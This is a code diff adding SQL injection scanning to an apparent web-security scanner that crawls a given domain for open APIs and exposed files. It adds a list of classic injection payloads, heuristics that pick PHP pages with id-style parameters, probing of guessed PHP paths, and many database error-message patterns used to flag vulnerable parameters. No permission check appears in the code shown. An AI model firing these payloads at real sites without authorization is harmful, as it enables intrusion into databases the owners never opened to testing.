@@ -46,6 +46,24 @@ const MAX_CRAWL_DEPTH = 3
 const MAX_PAGES_TO_CRAWL = 50
 const MAX_URLS_TO_CHECK = 200
 
+// SQL Injection test payloads (safe, non-destructive)
+const SQL_INJECTION_PAYLOADS = [
+  "' OR '1'='1",
+  "' OR '1'='1' --",
+  "' OR '1'='1' /*",
+  "1' OR '1'='1",
+  "1' OR '1'='1' --",
+  "' UNION SELECT NULL--",
+  "1' UNION SELECT NULL--",
+  "admin'--",
+  "admin'/*",
+  "' OR 1=1--",
+  "' OR 1=1#",
+  "' OR 1=1/*",
+  "') OR '1'='1--",
+  "1') OR ('1'='1--",
+]
+
 /**
  * Normalize domain - remove protocol and trailing slashes
  */
@@ -727,7 +745,222 @@ async function deepCrawlAndFindOpenAPIs(domain) {
     })
   }
 
-  return openAPIs
+  return { openAPIs, allDiscoveredUrls: Array.from(allDiscoveredUrls) }
+}
+
+/**
+ * Check if URL is a PHP page with parameters (potential SQL injection target)
+ */
+function isPhpUrlWithParams(url) {
+  try {
+    const urlObj = new URL(url)
+    const pathname = urlObj.pathname.toLowerCase()
+    const hasParams = urlObj.search.length > 0
+    
+    // Check if it's a PHP file or has common parameter names
+    const isPhp = pathname.endsWith('.php') || pathname.includes('.php')
+    const hasIdParam = urlObj.searchParams.has('id') || 
+                       urlObj.searchParams.has('user_id') ||
+                       urlObj.searchParams.has('product_id') ||
+                       urlObj.searchParams.has('page_id') ||
+                       urlObj.searchParams.has('cat_id') ||
+                       urlObj.searchParams.has('item_id')
+    
+    // Also check for common SQL injection parameter patterns in URL
+    const hasCommonParams = /[?&](id|user|product|page|cat|item|search|q|query)=/i.test(url)
+    
+    return (isPhp && hasParams) || hasIdParam || hasCommonParams
+  } catch {
+    return false
+  }
+}
+
+/**
+ * Test URL for SQL injection vulnerability
+ */
+async function testSqlInjection(url) {
+  try {
+    const urlObj = new URL(url)
+    const vulnerableParams = []
+    
+    // Get all parameters
+    const params = Array.from(urlObj.searchParams.keys())
+    
+    if (params.length === 0) {
+      return { vulnerable: false, url, details: null }
+    }
+    
+    // Test each parameter
+    for (const param of params.slice(0, 3)) { // Limit to first 3 params to avoid too many requests
+      for (const payload of SQL_INJECTION_PAYLOADS.slice(0, 5)) { // Test with first 5 payloads
+        try {
+          const testUrl = new URL(url)
+          testUrl.searchParams.set(param, payload)
+          
+          const response = await fetchWithTimeout(testUrl.href, { 
+            method: 'GET',
+            headers: {
+              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            }
+          })
+          
+          if (!response.ok) continue
+          
+          const responseText = await response.text()
+          
+          // Check for SQL error patterns
+          const sqlErrorPatterns = [
+            /mysql_fetch_array/i,
+            /mysql_fetch_assoc/i,
+            /mysql_num_rows/i,
+            /mysql_query/i,
+            /mysql_error/i,
+            /Warning.*mysql/i,
+            /SQL syntax.*MySQL/i,
+            /MySQLSyntaxErrorException/i,
+            /valid MySQL result/i,
+            /PostgreSQL.*ERROR/i,
+            /Warning.*\Wpg_/i,
+            /valid PostgreSQL result/i,
+            /Npgsql\./i,
+            /SQLite.*error/i,
+            /SQLite3::/i,
+            /Warning.*SQLite/i,
+            /Microsoft.*ODBC.*SQL Server/i,
+            /SQLServer JDBC Driver/i,
+            /ODBC SQL Server Driver/i,
+            /Warning.*odbc_/i,
+            /Warning.*mssql_/i,
+            /Warning.*sqlsrv_/i,
+            /SQLException/i,
+            /Unclosed quotation mark/i,
+            /Quoted string not properly terminated/i,
+            /SQL command not properly ended/i,
+            /ORA-\d{5}/i,
+            /Oracle error/i,
+            /Oracle.*Driver/i,
+            /Warning.*\Woci_/i,
+            /Warning.*\Wora_/i,
+            /Microsoft Access.*Driver/i,
+            /JET Database Engine/i,
+            /Access Database Engine/i,
+            /Fatal error.*call to a member function/i,
+            /mysqli_/i,
+            /PDOException/i,
+            /SQLSTATE\[/i,
+          ]
+          
+          // Check for SQL error in response
+          const hasSqlError = sqlErrorPatterns.some(pattern => pattern.test(responseText))
+          
+          // Check for different response length (potential SQL injection)
+          const originalResponse = await fetchWithTimeout(url, { method: 'GET' })
+          if (originalResponse.ok) {
+            const originalText = await originalResponse.text()
+            const lengthDiff = Math.abs(responseText.length - originalText.length)
+            const significantDiff = lengthDiff > 100 // More than 100 chars difference
+            
+            if (hasSqlError || significantDiff) {
+              vulnerableParams.push({
+                parameter: param,
+                payload: payload,
+                vulnerable: true,
+                evidence: hasSqlError ? 'SQL Error in response' : 'Response length difference',
+                response_sample: responseText.substring(0, 500),
+              })
+              break // Found vulnerability, move to next parameter
+            }
+          }
+        } catch {
+          // Skip failed test
+          continue
+        }
+      }
+    }
+    
+    if (vulnerableParams.length > 0) {
+      return {
+        vulnerable: true,
+        url: url,
+        vulnerable_params: vulnerableParams,
+        severity: 'HIGH',
+      }
+    }
+    
+    return { vulnerable: false, url, details: null }
+  } catch (error) {
+    return { vulnerable: false, url, error: error.message }
+  }
+}
+
+/**
+ * Find and test all PHP URLs with parameters for SQL injection
+ */
+async function findAndTestSqlInjection(domain, allDiscoveredUrls) {
+  const baseDomain = domain
+  const phpUrls = []
+  const sqlInjectionResults = []
+  
+  // Filter PHP URLs with parameters
+  for (const url of allDiscoveredUrls) {
+    if (isPhpUrlWithParams(url) && isSameDomain(url, baseDomain)) {
+      phpUrls.push(url)
+    }
+  }
+  
+  // Also check common PHP parameter patterns
+  const commonPhpPatterns = [
+    '/index.php?id=',
+    '/page.php?id=',
+    '/view.php?id=',
+    '/detail.php?id=',
+    '/product.php?id=',
+    '/article.php?id=',
+    '/news.php?id=',
+    '/category.php?id=',
+    '/user.php?id=',
+    '/profile.php?id=',
+  ]
+  
+  const baseUrl = `https://${domain}`
+  for (const pattern of commonPhpPatterns) {
+    const testUrl = baseUrl + pattern + '1'
+    if (!phpUrls.includes(testUrl)) {
+      phpUrls.push(testUrl)
+    }
+  }
+  
+  // Limit to 50 URLs to test (to avoid timeout)
+  const urlsToTest = phpUrls.slice(0, 50)
+  
+  // Test URLs in batches
+  const batchSize = 5
+  for (let i = 0; i < urlsToTest.length; i += batchSize) {
+    const batch = urlsToTest.slice(i, i + batchSize)
+    const results = await Promise.all(
+      batch.map(async (url) => {
+        try {
+          // First check if URL exists
+          const checkResponse = await fetchWithTimeout(url, { method: 'GET' })
+          if (checkResponse.ok || checkResponse.status === 500) {
+            // URL exists, test for SQL injection
+            return await testSqlInjection(url)
+          }
+          return null
+        } catch {
+          return null
+        }
+      })
+    )
+    
+    results.forEach(result => {
+      if (result && result.vulnerable) {
+        sqlInjectionResults.push(result)
+      }
+    })
+  }
+  
+  return sqlInjectionResults
 }
 
 /**
@@ -838,11 +1071,17 @@ export default {
       }
 
       // Perform scans - deep crawl will find all open APIs
-      const [commonEndpoints, deepCrawlOpenAPIs, sensitiveFiles] = await Promise.all([
+      const [commonEndpoints, deepCrawlResult, sensitiveFiles] = await Promise.all([
         scanCommonEndpoints(normalizedDomain),
         deepCrawlAndFindOpenAPIs(normalizedDomain),
         checkSensitiveFiles(normalizedDomain),
       ])
+      
+      const deepCrawlOpenAPIs = deepCrawlResult.openAPIs || []
+      const allDiscoveredUrls = deepCrawlResult.allDiscoveredUrls || []
+      
+      // Test for SQL injection vulnerabilities
+      const sqlInjectionResults = await findAndTestSqlInjection(normalizedDomain, allDiscoveredUrls)
 
       // Filter common endpoints to only show open ones
       const openCommonEndpoints = commonEndpoints.filter(e => e.open)
@@ -875,11 +1114,14 @@ export default {
         domain: normalizedDomain,
         open_apis: allOpenAPIs,
         exposed_sensitive_files: exposedSensitiveFiles,
+        sql_injection_vulnerabilities: sqlInjectionResults,
         scan_summary: {
           total_open_apis: allOpenAPIs.length,
           total_exposed_files: exposedSensitiveFiles.length,
+          total_sql_injection_vulns: sqlInjectionResults.length,
           common_endpoints_checked: commonEndpoints.length,
           common_endpoints_open: openCommonEndpoints.length,
+          php_urls_tested: sqlInjectionResults.length > 0 ? '50+' : 0,
         },
       }
 
